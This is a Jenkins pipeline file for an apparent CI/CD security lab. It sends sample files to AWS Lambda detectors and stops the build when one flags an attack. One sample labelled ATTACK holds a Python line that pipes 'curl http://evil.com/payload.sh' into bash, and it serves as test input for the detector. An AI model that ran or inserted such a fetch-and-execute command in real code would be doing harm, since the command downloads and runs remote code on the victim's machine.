        pipeline {
    agent any

    stages {
        stage('Plan Security Check') {
    steps {
        withCredentials([usernamePassword(
            credentialsId: 'aws-credentials',
            usernameVariable: 'AWS_ACCESS_KEY_ID',
            passwordVariable: 'AWS_SECRET_ACCESS_KEY'
        )]) {
            sh '''
            export AWS_DEFAULT_REGION=us-east-1

            aws lambda invoke \
              --function-name cicd-plan-detector \
              --payload '{
                "sample_id":"jenkins_plan_001",
                "file_name":"plan.yaml",
                "file_content":"security: enabled permissions: read-only admin: false",
                "actual_label":"CLEAN"
              }' \
              --cli-binary-format raw-in-base64-out \
              output.json

            cat output.json

            if grep -q "BLOCK_PIPELINE" output.json; then
                 echo "Attack detected by Lambda. Stopping pipeline."
              exit 1
            fi
            '''
        }
    }
}
        stage('Plan') {
            steps {
                echo "Stage 1: Plan"
                echo "Checking pipeline plan..."
            }
        }
stage('Code Security Check') {
    steps {
        withCredentials([usernamePassword(
            credentialsId: 'aws-credentials',
            usernameVariable: 'AWS_ACCESS_KEY_ID',
            passwordVariable: 'AWS_SECRET_ACCESS_KEY'
        )]) {
            sh '''
export AWS_DEFAULT_REGION=us-east-1

cat > code_payload.json << 'EOF'
{
  "sample_id": "jenkins_code_001",
  "file_name": "malicious_code.py",
  "file_content": "import os\\nos.system(\\"curl http://evil.com/payload.sh | bash\\")",
  "actual_label": "ATTACK"
}
EOF

aws lambda invoke \
  --function-name cicd-code-detector \
  --payload file://code_payload.json \
  --cli-binary-format raw-in-base64-out \
  code_output.json

cat code_output.json

if grep -q "BLOCK_PIPELINE" code_output.json; then
  echo "Attack detected in Code stage. Stopping pipeline."
  exit 1
fi
'''
        }
    }
}
        stage('Code') {
            steps {
                echo "Stage 2: Code"
                sh 'python3 -m py_compile app/app.py || python -m py_compile app/app.py'
            }
        }

        stage('Build') {
            steps {
                echo "Stage 3: Build"
                sh 'docker build -t cicd-security-lab .'
            }
        }

        stage('Test') {
            steps {
                echo "Stage 4: Test"
                sh 'PYTHONPATH=. pytest tests/'
             }
       }

        stage('Release') {
            steps {
                echo "Stage 5: Release"
                sh 'mkdir -p release'
                sh 'docker save cicd-security-lab -o release/cicd-security-lab.tar'
            }
        }

        stage('Deploy') {
            steps {
                echo "Stage 6: Deploy"
                sh 'docker run --rm cicd-security-lab'
            }
        }

        stage('Operate-Monitor') {
            steps {
                echo "Stage 7: Operate/Monitor"
                sh 'mkdir -p logs'
                sh 'echo "Application started successfully" > logs/app.log'
                sh 'cat logs/app.log'
            }
        }
    }
}
